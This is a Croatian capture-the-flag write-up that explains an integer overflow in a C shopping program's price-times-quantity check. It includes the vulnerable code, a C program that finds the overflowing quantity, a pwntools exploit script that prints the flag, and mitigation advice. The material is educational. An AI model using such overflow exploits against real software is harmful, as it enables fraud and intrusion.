# Writeup

## Otkrivanje ranjivosti

Detaljnom analizom izvornog koda programa, uočena je potencijalna ranjivost programa **integer overflow** kod kupovine stvari. 

Isječak koda koji sadrži ranjivost:
```c
if(dostupneStvari[opcija-1].cijena * kolicina <= novac){
		novac-= dostupneStvari[opcija-1].cijena * kolicina;
		printf("Kupljeno: %s (%dx)\n", dostupneStvari[opcija-1].ime,kolicina);
		
		if(opcija-1 == 4){
			tajnaStvarKupljena();
		}
		
		return;
}
```
Kako bi izraz ```dostupneStvari[opcija-1].cijena * kolicina <= novac``` bio istinit, može se za količinu stvari _Super tajna stvar_ unijeti veliki broj koji će zbog integer overflow-a zadovoljiti izraz.

## Objašnjenje ranjivosti

Najveća moguća vrijednost varijable tipa int u C programskom jeziku je ```2 147 483 647```. Ako integer varijabla sadrži tu najveću vrijednost i inkrementira se za jedan, tada će nova vrijednost biti ```-2 147 483 648```. To se događa zbog integer overflow-a, gdje se nakon postizanja najveće moguće vrijednosti 32-bitnog int tipa (2 147 483 647) inkrementiranjem prelazi u negativni raspon zbog dvokomplementnog prikaza brojeva, gdje se najviši bit koristi za predznak broja.

Na sljedećoj slici prikazan je primjer integer overflow-a u 8-bitnom dvokomplementnom prikazu brojeva (32-bitni prikaz je sličan).

<p align="center">
 <a href="https://github.com/user-attachments/assets/cf8c8832-7cf6-407f-92f5-4d14117470fb">
  <img src="https://github.com/user-attachments/assets/cf8c8832-7cf6-407f-92f5-4d14117470fb"/>
  <a/>
<p/>


Kod dvokomplementnog prikaza brojeva, najznačajniji bit se koristi za mogućnost spremanja negativnih brojeva. U ovom primjeru, najznačajniji bit nosi vrijednost ```-128```. Ako se na vrijednost ```127``` (koja u binarnom prikazu ima sve jedinice osim najznačajnijeg bita) pribroji jedan, tada će se sve jedinice pretvoriti u nule i jedinica će se prenijeti na najznačajniji bit.

U zadatku dolazi do integer overflowa prilikom umnoška cijene i količine. Budući da su obje varijable tipa ```int```, i njihov umnožak je također tipa ```int```. Zbog ograničenja raspona ovog tipa podatka, ako je rezultat umnoška prevelik za pohranu, dolazi do integer overflow-a.

Izrađen je kratak program koji traži najmanju količinu koja kada se pomnoži s cijenom stvari _Super tajna stvar_ uzrokuje integer overflow:
```c
#include <stdio.h>

int main()
{
    int cijena = 2232350;
    int kolicina = 1;
    for(;kolicina<99999999;kolicina++){
        int ukupno = kolicina*cijena;
        
        if(ukupno<=0){
            printf("%d\n",kolicina);
            printf("%d\n",ukupno);
            break;
        }
    }

    return 0;
}
```

Izlaz programa:
```
962
-2147446596
```

Iz izlaza programa vidimo kako je najmanja količina koja uzrokuje integer overflow jednaka ```962```. Umnoškom cijene i količine dobi se ```-2 147 446 596```

Izraz ```dostupneStvari[opcija-1].cijena * kolicina <= novac``` postaje ```-2 147 446 596 <= novac```. Pošto je ```novac``` uvijek veći ili jednak nuli, izraz postaje uvijek istinit.


## Iskorištenje ranjivosti

Za izradu rješenja može se napraviti Python skripta koja iskorištava integer overflow ranjivost u zadatku. Skripta koristi ```pwntools``` biblioteku za interakciju s kompajliranim programom, omogućujući slanje podataka i primanje odgovora od procesa pokrenutog programa. Nakon pokretanja programa, skripta odabire opciju kupnje stvari (3), zatim bira stvar _Super tajna stvar_ (5) i na kraju šalje količinu koja  uzrokuje integer overflow (962).

```python
from pwn import *

io = process("./kupovina") #da možemo slati i primati podatke od procesa
elf = ELF("./kupovina") #omogucava pwntools-u da može procitati gdje su adrese funkcija

# = = = START

print(io.recvuntil(b"Odabir:")) #pricekaj ovaj output, pa zatim nastavi
# b ispred stringa veli pythonu da on string tretira kao bytove i pwntools očekuje podatke u obliku bajtova
# python koristi UTF-8 stringove pa dolaze upozorenja ako se ne koristi b

io.sendline(b"3") #biranje opcije 3

print(io.recvuntil(b"Odaberite stvar koju zelite kupiti (0 za izlaz):")) 
io.sendline(b"5") #biranje opcije 5

payload = b""
payload += b"962"

# = = = END

io.sendline(payload) #slanje exploita
print(payload)

io.interactive() #prebacuje stdin i stdout na standardni ulaz i izlaz, vraća kontrolu korisniku (terminalu)

```


Pokretanjem ove skripte, ispiše se flag ```CTFFOI[1nt3ger_0VERFL0W]```.

## Edukativne smjernice
- _Integer overflow_ je ranjivost kod koje se pri aritmetičkim operacijama (npr. zbrajanju i množenju) prekorači maksimalna vrijednost u varijabli tipa _int_, pa rezultat preleti u negativni raspon i može prevariti logiku usporedbe.
- Za zaštitu od ove vrste napada preporučuje se:
  - Prije računanja provjeriti hoće li ```cijena * količina``` ostati unutar valjanog raspona.
  - Uvesti ograničenja na ulazne brojeve (maksimalna količina) kako bi se spriječile ekstremne vrijednosti.
  - Koristiti veće tipove podataka (npr. long) kad su vrijednosti velike.
